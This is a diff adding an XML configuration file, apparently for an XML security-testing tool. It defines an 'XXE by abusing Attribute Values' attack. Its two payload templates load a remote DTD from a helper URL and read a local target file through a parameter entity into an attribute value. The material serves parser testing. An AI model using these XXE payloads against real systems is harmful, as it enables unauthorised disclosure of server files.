@@ -1,0 +1,21 @@
+<config>
+<name>XXE by abusing Attribute Values</name>
+<description>...</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>true</targetFile>
+    <helperURL>true</helperURL>
+    <attackListenerURL>false</attackListenerURL>
+</params>
+<attackvectors>
+<attackvector><![CDATA[<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+]>
+<data attrib='&internal;'/>]]></attackvector>
+<attackvector><![CDATA[<!ENTITY % payload SYSTEM "file:§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
+%param1;]]></attackvector>
+</attackvectors>
+</config>
